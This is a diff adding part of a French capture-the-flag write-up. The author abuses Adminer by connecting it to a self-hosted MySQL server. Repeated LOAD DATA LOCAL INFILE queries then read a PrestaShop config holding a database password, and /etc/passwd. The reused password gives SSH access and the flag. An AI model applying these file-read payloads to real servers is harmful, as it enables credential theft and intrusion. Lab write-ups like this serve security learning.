@@ -60,3 +60,37 @@ Je tente un peu au hasard common directory wordlist et la je trouve un truc inte
 Ce qui est interessant ici c'est que nous pouvons nous connecter à n'importe quel serveur MySQL. Google nous sauve encore "Free Hosting MySQL".
 On crée donc un serveur SQL puis on se connecte depuis adminer dessus. 
 
+A partir de la on peut lire n'importe quel fichier dont on a le droit de lecture avec les commandes SQL suivantes:
+```
+        load data local infile 'la/votre/file'
+        into table truc
+        fields terminated by "\n"
+```
+
+On sait que c'est du Pretashop et je me suis documenté dessus sur internet et le fichier app/config/parameters.php est très interessant 
+on lance donc:
+```
+        load data local infile 'app/config/parameters.php'
+        into table truc
+        fields terminated by "\n"
+```
+
+Un truc nous interesse tout d'un coup 
+```
+'database_password' => 'KA6$g@Tx0{(Si4bR3DT4'
+```
+On a un mot de passe mais pas de user je test admin, ça marche pas, coup de rage je vais faire une partie de foot avec mon petit frère et je reviens.
+La je fais un peu de pwn (je tentais le String Oriented Programming pour les curieux ) puis j'ai une idée que j'aurai du avoir plus tôt : Normalement c'est un reflexe ! J'essaie de récuperer /etc/passwd
+
+```
+        load data local infile '/etc/passwd'
+        into table truc
+        fields terminated by "\n"
+```
+
+Ici je me connecte a la base SQl en localhost depuis Adminer avec un username que l'on voit dans /etc/passwd : "john" et le mot de passe trouvé avant : "KA6$g@Tx0{(Si4bR3DT4"
+Je trouve rien d'interessant. Je rage encore. Je reviens après et je me rappelle que le port 22 était ouvert en SSH !! Je test et oui !! Il avait utilisé le même mot de passe ! 
+
+````cat flag.txt```
+
+Et la le plaisir de voir aparaître le flag: SANTA{That-W4Z/a/C0ol-CV3!}
